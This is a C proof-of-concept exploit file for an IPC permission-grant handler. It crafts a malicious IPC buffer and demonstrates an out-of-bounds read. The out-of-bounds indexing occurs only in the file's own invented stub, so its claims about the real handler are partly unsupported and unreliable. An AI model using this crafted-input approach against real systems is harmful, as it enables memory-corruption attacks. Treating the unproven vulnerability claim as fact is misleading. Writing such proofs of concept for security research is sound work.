/*
 * PoC: Buffer access with untrusted index without bounds validation
 * 
 * Vulnerability: ReplyGrantPermission reads strings from an IPC request (IpcIo)
 * and passes them directly to api->GrantPermission() without any bounds validation.
 * The ReadString function returns pointers into the IPC buffer, and the lengths
 * (idLen, permLen) are attacker-controlled. If the IpcIo buffer is crafted with
 * malicious length fields, ReadString can return pointers that reference memory
 * beyond the buffer bounds, or the returned strings can be used as indices/keys
 * into internal permission tables without validation.
 *
 * CWE: CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)
 *      CWE-129 (Improper Validation of Array Index)
 *
 * How input triggers it:
 *   - We craft an IpcIo buffer with a string length field that exceeds the actual
 *     buffer size, causing ReadString to return a pointer past buffer bounds or
 *     a string that when used as an identifier/index causes out-of-bounds access
 *     in the GrantPermission lookup table.
 *   - No bounds check is performed on the values read from the IPC request before
 *     they are used to index into internal data structures.
 *
 * Expected behavior: Out-of-bounds read/write, potential crash (SIGSEGV/SIGABRT)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Stub types and definitions for external dependencies */
typedef int pid_t;
typedef unsigned int uid_t;
typedef int int32_t;

/* Simulated IpcIo structure - represents the IPC message buffer */
typedef struct {
    char *bufferCur;    /* Current read position in buffer */
    char *bufferBase;   /* Base of buffer */
    size_t bufferLeft;  /* Bytes remaining */
} IpcIo;

/* Stub: InnerPermLiteApi with GrantPermission function pointer */
typedef struct {
    int32_t (*GrantPermission)(const char *identifier, const char *permName);
} InnerPermLiteApi;

/* Permission table - simulates internal storage with fixed bounds */
#define MAX_PERMISSIONS 8
static const char *g_permTable[MAX_PERMISSIONS] = {
    "ohos.permission.READ",
    "ohos.permission.WRITE",
    "ohos.permission.CAMERA",
    NULL
};

/* Stub: GetCallingPid */
pid_t GetCallingPid(void) { return 1000; }

/* Stub: GetCallingUid */
uid_t GetCallingUid(void) { return 1000; }

/* Stub: HILOG_INFO - no-op */
#define HILOG_MODULE_APP 0
#define HILOG_INFO(module, fmt, ...) do { } while(0)

/*
 * Stub: ReadString - simulates reading a string from IPC buffer.
 * This returns a pointer into the raw buffer and sets *len from the
 * attacker-controlled length field embedded in the buffer.
 * No bounds validation is performed on the length.
 */
char *ReadString(IpcIo *req, size_t *len)
{
    /* Read the 4-byte length prefix from the buffer (attacker-controlled) */
    if (req->bufferLeft < sizeof(uint32_t)) {
        *len = 0;
        return NULL;
    }
    uint32_t reportedLen;
    memcpy(&reportedLen, req->bufferCur, sizeof(uint32_t));
    req->bufferCur += sizeof(uint32_t);
    req->bufferLeft -= sizeof(uint32_t);

    /* VULNERABILITY: We trust reportedLen without checking against bufferLeft */
    /* This allows returning a pointer to memory beyond the buffer */
    *len = reportedLen;
    char *str = req->bufferCur;

    /* Advance cursor by reported length (may exceed actual buffer) */
    req->bufferCur += reportedLen;
    /* bufferLeft underflow possible here - no check */
    req->bufferLeft -= reportedLen;

    printf("[PoC] ReadString returned ptr=%p, reported len=%zu\n", (void*)str, *len);
    return str;
}

/* Stub: WriteInt32 */
void WriteInt32(IpcIo *reply, int32_t val)
{
    printf("[PoC] WriteInt32: reply value = %d\n", val);
}

/*
 * Stub GrantPermission: simulates looking up permission by identifier
 * used as an index. The identifier string is parsed as a numeric index
 * into the permission table WITHOUT bounds checking.
 */
/* TRIGGER: The untrusted identifier is used to index into a fixed-size array */
int32_t StubGrantPermission(const char *identifier, const char *permName)
{
    printf("[PoC] GrantPermission called with identifier='%s', permName='%s'\n",
           identifier ? identifier : "(null)",
           permName ? permName : "(null)");

    if (!identifier || !permName) {
        return -1;
    }

    /* Simulate: identifier is used as numeric index into permission table */
    /* TRIGGER: No bounds check on the index derived from untrusted input */
    int index = atoi(identifier);
    printf("[PoC] Using identifier as index: %d (table size: %d)\n", index, MAX_PERMISSIONS);

    /* Out-of-bounds access when index >= MAX_PERMISSIONS or index < 0 */
    const char *entry = g_permTable[index];  /* TRIGGER: OOB access here */
    printf("[PoC] Accessed g_permTable[%d] = %s\n", index, entry ? entry : "(null)");

    return 0;
}

/* ===== REAL CHAIN FUNCTION (from source) ===== */

/* Chain step: main -> ReplyGrantPermission */
static void ReplyGrantPermission(const void *origin, IpcIo *req, IpcIo *reply, InnerPermLiteApi* api)
{
    pid_t callingPid = GetCallingPid();
    uid_t callingUid = GetCallingUid();
    HILOG_INFO(HILOG_MODULE_APP, "Enter ID_GRANT, [callerPid: %d][callerUid: %u]", callingPid, callingUid);
    size_t permLen = 0;
    size_t idLen = 0;

    /* Chain step: ReplyGrantPermission -> ReadString (reads untrusted data) */
    char *identifier = (char *)ReadString(req, &idLen);
    char *permName = (char *)ReadString(req, &permLen);

    /* Chain step: ReplyGrantPermission -> api->GrantPermission
     * No bounds validation on identifier or permName before use as index */
    int32_t ret = api->GrantPermission(identifier, permName);
    HILOG_INFO(HILOG_MODULE_APP, "grant permission, [id: %s][perm: %s][ret: %d]", identifier, permName, ret);
    WriteInt32(reply, ret);
}

/*
 * main() - Crafts a malicious IPC buffer that causes out-of-bounds access.
 *
 * The buffer contains:
 *   1. A string "99" as identifier (will be used as index 99, far beyond table size 8)
 *   2. A string "ohos.permission.READ" as permName
 *
 * The identifier "99" passes through ReadString without validation and is then
 * used by GrantPermission to index into a table of size MAX_PERMISSIONS (8),
 * causing an out-of-bounds memory access.
 */
int main(void)
{
    printf("[PoC] === Buffer access with untrusted index - No bounds validation ===\n");
    printf("[PoC] Crafting malicious IPC request with out-of-bounds index...\n");

    /* Craft the IPC buffer with two strings:
     * Format: [uint32_t len]["string\0"][uint32_t len]["string\0"]
     */
    char ipc_buffer[256];
    memset(ipc_buffer, 0, sizeof(ipc_buffer));
    char *ptr = ipc_buffer;

    /* First string: identifier = "99" (will cause OOB when used as index) */
    /* WHY: "99" as an index exceeds MAX_PERMISSIONS (8), causing OOB access */
    uint32_t id_len = 3; /* "99\0" */
    memcpy(ptr, &id_len, sizeof(uint32_t));
    ptr += sizeof(uint32_t);
    memcpy(ptr, "99", 3); /* includes null terminator */
    ptr += id_len;

    /* Second string: permName = "ohos.permission.READ" */
    const char *perm = "ohos.permission.READ";
    uint32_t perm_len = strlen(perm) + 1;
    memcpy(ptr, &perm_len, sizeof(uint32_t));
    ptr += sizeof(uint32_t);
    memcpy(ptr, perm, perm_len);
    ptr += perm_len;

    /* Set up IpcIo to point to our crafted buffer */
    IpcIo req;
    req.bufferBase = ipc_buffer;
    req.bufferCur = ipc_buffer;
    req.bufferLeft = (size_t)(ptr - ipc_buffer);

    IpcIo reply;
    memset(&reply, 0, sizeof(reply));

    /* Set up the API with our stub GrantPermission */
    InnerPermLiteApi api;
    api.GrantPermission = StubGrantPermission;

    printf("[PoC] IPC buffer size: %zu bytes\n", req.bufferLeft);
    printf("[PoC] Identifier in buffer: \"99\" (index=99, table_size=%d)\n", MAX_PERMISSIONS);
    printf("[PoC] Calling ReplyGrantPermission with crafted IPC request...\n\n");

    /* Chain step: main -> ReplyGrantPermission (entry point) */
    /* The untrusted index flows: IPC buffer -> ReadString -> GrantPermission -> array[index] */
    ReplyGrantPermission(NULL, &req, &reply, &api);

    printf("\n[PoC] If execution reached here, OOB read occurred silently.\n");
    printf("[PoC] In a real system, index 99 into a size-8 table reads arbitrary memory.\n");

    return 0;
}